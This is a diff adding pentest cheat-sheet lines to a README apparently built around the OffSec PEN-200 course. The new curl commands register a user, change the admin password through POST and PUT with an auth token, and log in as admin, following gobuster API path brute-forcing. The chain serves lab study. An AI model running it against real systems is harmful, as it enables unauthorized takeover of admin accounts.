@@ -115,4 +115,17 @@ This repo is structured in the same manner as the OffSec PEN-200 course and will
 - Brute forcing API paths with gobuster: ```gobuster dir -u http://<host IP>:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern```
 - Using curl to inspect API: ```curl -i http://<host IP>:5002/<API path>```
 - Using curl to deeper inspect API using found data: ```gobuster dir -u http://<host IP>:5002/<API path>/<user or data>/ -w /usr/share/wordlists/dirb/small.txt```
+- Crafting a POST request against a login API: ```curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/login```
+- Attempt to register new user: ```curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/register```
+- Changing admin password with POST request: ```curl  \
+  'http://<host IP>:5002/<API path>/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth <auth token>' \
+  -d '{"password": "pwned"}'```
+- Changing admin password with PUT request: ```curl -X 'PUT' \
+  'http://<host IP>:5002/<API path>/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth <auth token>' \
+  -d '{"password": "pwned"}'```
+- Login as admin: ```curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://<host IP>:5002/<API path>/login```
 - 
